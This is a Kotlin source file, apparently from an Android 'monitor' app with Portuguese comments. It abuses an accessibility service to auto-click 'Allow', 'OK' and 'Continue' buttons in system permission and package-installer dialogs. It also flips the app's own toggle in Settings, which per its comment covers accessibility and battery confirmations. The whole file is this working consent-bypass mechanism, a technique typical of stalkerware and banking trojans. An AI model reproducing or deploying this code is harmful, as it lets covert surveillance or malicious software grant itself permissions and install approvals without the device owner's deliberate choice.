package com.example.monitor

import android.accessibilityservice.AccessibilityService
import android.os.SystemClock
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Clica nos diálogos do sistema: permissões, confirmação de acessibilidade e bateria.
 */
object PermissionClicker {

    private const val JANELA = 10 * 60 * 1000L

    private var ate = 0L
    private var ultimo = 0L

    private val BOTOES = listOf(
        "permitir tudo", "permitir", "allow all", "allow",
        "ao usar o app", "while using the app",
        "somente desta vez", "só desta vez", "ok", "continuar"
    )

    fun armar() {
        ate = System.currentTimeMillis() + JANELA
    }

    fun ativo(): Boolean = System.currentTimeMillis() < ate

    fun agir(servico: AccessibilityService, pacote: String?) {
        if (!ativo()) return
        val agora = SystemClock.uptimeMillis()
        if (agora - ultimo < 400) return
        val raiz = servico.rootInActiveWindow ?: return

        val nosso = pacote != null && (
            pacote.contains("permissioncontroller") ||
                pacote.contains("packageinstaller") ||
                pacote == "com.android.settings"
            )
        if (!nosso) return

        for (b in BOTOES) {
            if (clicar(raiz, b)) {
                ultimo = agora
                return
            }
        }

        if (pacote == "com.android.settings") {
            val rotulo = servico.getString(R.string.app_name)
            if (tocarSwitch(raiz, rotulo)) ultimo = agora
        }
    }

    private fun clicar(no: AccessibilityNodeInfo?, texto: String): Boolean {
        if (no == null) return false
        val t = no.text?.toString()?.trim()?.lowercase()
        if (t == texto && no.isClickable) {
            return no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        for (i in 0 until no.childCount) {
            if (clicar(no.getChild(i), texto)) return true
        }
        return false
    }

    private fun tocarSwitch(raiz: AccessibilityNodeInfo, rotulo: String): Boolean {
        val linha = acharTexto(raiz, rotulo) ?: return false
        var atual: AccessibilityNodeInfo? = linha
        var nivel = 0
        while (atual != null && nivel < 5) {
            val alvo = acharSwitch(atual)
            if (alvo != null && alvo.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            atual = atual.parent
            nivel++
        }
        return false
    }

    private fun acharTexto(no: AccessibilityNodeInfo?, alvo: String): AccessibilityNodeInfo? {
        if (no == null) return null
        if (no.text?.toString()?.trim() == alvo) return no
        for (i in 0 until no.childCount) {
            acharTexto(no.getChild(i), alvo)?.let { return it }
        }
        return null
    }

    private fun acharSwitch(no: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (no.isCheckable) return no
        if (no.className?.toString()?.contains("Switch") == true) return no
        for (i in 0 until no.childCount) {
            val filho = no.getChild(i) ?: continue
            acharSwitch(filho)?.let { return it }
        }
        return null
    }
}